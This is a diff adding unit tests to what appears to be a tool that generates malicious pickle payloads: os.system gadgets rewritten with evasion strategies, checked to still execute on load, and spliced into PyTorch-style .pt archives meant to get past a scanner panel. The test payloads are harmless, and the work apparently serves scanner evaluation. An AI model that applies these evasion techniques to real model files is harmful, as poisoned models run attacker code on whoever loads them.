@@ -197,16 +197,61 @@ class TestIndirectChainStrategy(unittest.TestCase):
         # os.system("exit 3") -> wait status 3 << 8 = 768
         self.assertEqual(pickle.loads(out), 768)
 
+    def test_dotted_module_resolves_leaf_not_toplevel(self):
+        # __import__('os.path') returns os; getattr(os, 'join') raises.
+        # fromlist=['join'] returns os.path so getattr binds the leaf sink.
+        stream = b"".join([
+            OP["GLOBAL"].code + b"os.path\njoin\n",
+            pickle.dumps(("/a", "b"), protocol=2)[2:-1],
+            OP["REDUCE"].code,
+            OP["STOP"].code,
+        ])
+        out = self.s.apply(stream)
+        _assert_parses(self, out)
+        self.assertEqual(pickle.loads(out), os.path.join("/a", "b"))
+
+    def test_fromlist_present_in_import_args(self):
+        out = self.s.apply(_malicious_stream("true"))
+        self.assertIn(
+            pickle.dumps(("os", None, None, ["system"]), protocol=2)[2:-1], out)
+
 
 class TestApplyPipelineAndSelection(unittest.TestCase):
     def test_pipeline_composition_preserves_execution(self):
+        # Default k is capped at {0,1}; every sampled set must stay
+        # load-equivalent on the standard malicious stream.
         rng = random.Random(20260823)
-        for seed in range(10):
+        for seed in range(20):
             rng.seed(seed)
             names = select_strategies(rng)
+            self.assertLessEqual(len(names), 1)
             out = apply_pipeline(_malicious_stream("true"), list(names))
             parse_pickle(out)  # structural sanity
             self.assertEqual(pickle.loads(out), 0, f"seed={seed} names={names}")
+
+    def test_every_single_strategy_preserves_execution(self):
+        # Exercise each strategy standalone across many random seeds to hit
+        # its random branches (string_encoding_variants, opcode_reordering,
+        # dead_code_injection, module_aliasing, ...).
+        for name in STRATEGIES:
+            s = get_strategy(name)
+            for seed in range(25):
+                random.seed(seed)
+                out = s.apply(_malicious_stream("true"))
+                parse_pickle(out)
+                self.assertEqual(pickle.loads(out), 0,
+                                 f"{name} seed={seed}")
+
+    def test_ordered_pairs_preserve_execution(self):
+        # Composition in PIPELINE_ORDER over every strategy pair (the way
+        # campaigns combine them) must keep the stream load-equivalent.
+        from itertools import combinations
+        from pipeline.evasion import PIPELINE_ORDER
+        for a, b in combinations(PIPELINE_ORDER, 2):
+            random.seed(7)
+            out = apply_pipeline(_malicious_stream("true"), [a, b])
+            parse_pickle(out)
+            self.assertEqual(pickle.loads(out), 0, f"{a}+{b}")
 
     def test_unknown_names_ignored(self):
         blob = _malicious_stream("true")
@@ -215,6 +260,20 @@ class TestApplyPipelineAndSelection(unittest.TestCase):
     def test_get_strategy_unknown(self):
         self.assertIsNone(get_strategy("nope"))
         self.assertIsNotNone(get_strategy("stack_global_encoding"))
+
+    def test_module_aliasing_never_emits_py2_builtin(self):
+        s = get_strategy("module_aliasing")
+        for seed in range(25):
+            random.seed(seed)
+            out = s.apply(_malicious_stream("true"))
+            parsed = parse_pickle(out)
+            for op, arg in parsed:
+                if op.name in ("GLOBAL", "INST", "STACK_GLOBAL"):
+                    if op.name == "STACK_GLOBAL":
+                        self.assertNotIn(b"\x0b__builtin__", out)
+                    else:
+                        self.assertNotIn(b"__builtin__\n", out)
+            self.assertEqual(pickle.loads(out), 0)
 
 
 class TestEncodingMutator(unittest.TestCase):
@@ -261,6 +320,11 @@ class TestIndirectChainFamily(unittest.TestCase):
     def test_trigger_text_present_as_wrapped_arg(self):
         blob = IndirectChainTemplate().generate_pickle_payload("SENTINEL_XYZ")
         self.assertIn(b"SENTINEL_XYZ", blob)
+
+    def test_dotted_module_family_resolves_leaf(self):
+        blob = IndirectChainTemplate("os.path", "join").generate_pickle_payload("x=1")
+        parse_pickle(blob)
+        self.assertIsInstance(pickle.loads(blob), str)
 
 
 class TestSpliceTransport(unittest.TestCase):
@@ -377,6 +441,68 @@ class TestStreamFusionHardening(unittest.TestCase):
             # Host stream: harness dict + spliced body -> exactly one STOP.
             parsed = parse_pickle(pkl)
             self.assertEqual(sum(1 for o, _ in parsed if o.name == "STOP"), 1)
+
+
+class TestPlausibilityImportPairs(unittest.TestCase):
+    """Regression: the plausibility gate must recognize STACK_GLOBAL-form
+    imports, or evasion-rewritten gadget candidates are rejected before
+    they reach the scanner panel (a self-defeating gate)."""
+
+    def _pt_bytes(self):
+        import io, zipfile
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w") as z:
+            z.writestr("archive/version", b"3")
+            z.writestr("archive/data.pkl",
+                       pickle.dumps({"w": [1.0]}, protocol=4))
+        return buf.getvalue()
+
+    def test_import_pairs_reads_global_and_stack_global(self):
+        from pipeline.generator import _import_pairs, _plausible_candidate
+        import struct
+        # raw GLOBAL pair
+        raw = b"".join([
+            OP["GLOBAL"].code + b"os\nsystem\n",
+            pickle.dumps(("true",), protocol=2)[2:-1],
+            OP["REDUCE"].code, OP["STOP"].code,
+        ])
+        self.assertIn(("os", "system"), _import_pairs(parse_pickle(raw)))
+        # STACK_GLOBAL pair (what stack_global_encoding emits)
+        sg = b"".join([
+            OP["SHORT_BINUNICODE"].code + bytes([2]) + b"os",
+            OP["SHORT_BINUNICODE"].code + bytes([6]) + b"system",
+            OP["STACK_GLOBAL"].code,
+            pickle.dumps(("true",), protocol=2)[2:-1],
+            OP["REDUCE"].code, OP["STOP"].code,
+        ])
+        self.assertIn(("os", "system"), _import_pairs(parse_pickle(sg)))
+
+    def test_plausibility_accepts_rewritten_gadget(self):
+        # A gadget candidate rewritten by stack_global_encoding must still be
+        # admitted: the dangerous callable now lives in STACK_GLOBAL pairs.
+        from pipeline.evasion import apply_pipeline
+        from pipeline.generator import _plausible_candidate
+        raw = b"".join([
+            OP["GLOBAL"].code + b"os\nsystem\n",
+            pickle.dumps(("true",), protocol=2)[2:-1],
+            OP["REDUCE"].code, OP["STOP"].code,
+        ])
+        rewritten = apply_pipeline(raw, ["stack_global_encoding"])
+        self.assertTrue(_plausible_candidate(rewritten, self._pt_bytes(), "gadget"))
+
+    def test_generator_emits_rewritten_gadget(self):
+        from pipeline.generator import CandidateGenerator
+        blob = CandidateGenerator().generate_candidate_pt(
+            benign_pt_bytes=self._pt_bytes(),
+            payload_code="x=1",
+            dangerous_callable=("os", "system"),
+            attack_family="gadget",
+            evasion_strategies=["stack_global_encoding"],
+            injection_transport="splice")
+        import zipfile, io
+        with zipfile.ZipFile(io.BytesIO(blob)) as z:
+            pkl = z.read("archive/data.pkl")
+        self.assertEqual(parse_pickle(pkl)[-1][0].name, "STOP")
 
 
 if __name__ == "__main__":
